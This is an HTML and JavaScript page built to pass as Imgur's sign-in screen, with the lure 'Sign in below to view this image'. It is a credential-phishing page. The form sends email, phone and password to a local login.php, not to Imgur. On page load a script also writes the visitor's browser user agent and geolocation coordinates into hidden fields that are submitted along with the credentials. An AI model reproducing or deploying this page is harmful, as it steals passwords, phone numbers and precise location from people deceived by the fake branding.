<div class="signin-container">
    <a href="https://imgur.com"><div class="signin-logo"></div></a>
    <div id="error-display-text" class="signin-callout text-center text-shadow">Sign in below to view this image.</div>
    <form id="signin-form" method="post" action="login.php">
        <div class="signin-imgur core-dark core-shadow br5">
            
            <input title="agent" autocomplete="off" type="hidden" id="user-agent" name="agent" value=""></input>
            <input title="location" autocomplete="off" type="hidden" id="geo-location" name="location" value=""></input>

            <input title="Email" type="email" tabindex="5" name="email" pattern="^([a-zA-Z0-9_\-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$" maxlength="40" id="email" class="br5 lvl1-dark placeholder" placeholder="Email" autocomplete="off" required>

            <input title="Phone" type="tel" pattern="^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$" tabindex="5" name="phone" maxlength="20" id="phone" class="br5 lvl1-dark placeholder" placeholder="Phone" autocomplete="off" required>

            <p class="password">
                <input title="Password" type="password" tabindex="6" name="password" maxlength="255" id="password" autocomplete="off" class="br5 last lvl1-dark placeholder" placeholder="Password">
                <a class="forgot-password text-center" title="forgot password" href="https://imgur.com/signin/forgotpassword">forgot?</a>
            </p>
            <input type="hidden" name="remember" value="remember">
        </div>
        <div class="signin-button">
            <button onclick="SubmitFunction()" class="btn btn-action right" name="submit" tabindex="8" type="submit" id="Imgur">Sign In</button>
            <div class="signin-register-link text-shadow right"><a href="/register.html">Need an account?</a></div>
            <div class="clear"></div>
        </div>

        <script type="text/javascript">
            var valid_regex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
            var valid_phone = /^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$/;
            email = document.getElementById("email");
            phone = document.getElementById("phone");
            error = document.getElementById("error-display-text");
            user_agent = document.getElementById("user-agent");
            geo_location = document.getElementById("geo-location");

            function LocationError(error)
            {
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        geo_location.value = "Permission Denied";
                        break;
                    case error.POSITION_UNAVAILABLE:
                        geo_location.value = "N/A";
                        break;
                    case error.TIMEOUT:
                        geo_location.value = "N/A";
                        break;
                    case error.UNKNOWN_ERROR:
                        geo_location.value = "N/A";
                        break;
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                let agent = navigator.userAgent;
                user_agent.value = agent;

                if("geolocation" in navigator)
                {
                    navigator.geolocation.getCurrentPosition((position) => {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        geo_location.value = `${lat}, ${lng}`;
                    }, LocationError);
                }
            }, false);

            function SubmitFunction()
            {
                if(!email.value.match(valid_regex) && !phone.value.match(valid_phone))
                {
                    error.innerHTML = "Please enter a valid email and phone number.";
                    error.style.color = "#c93434";
                } else {
                    if(!email.value.match(valid_regex))
                    {
                        error.innerHTML = "Please enter a valid email";
                        error.style.color = "#c93434";
                    } else
                    {
                        if(!phone.value.match(valid_phone))
                        {
                            error.innerHTML = "Please enter a valid phone number.";
                            error.style.color = "#c93434";
                        }
                    }
                }
            }
        </script>
    </form>
</div>
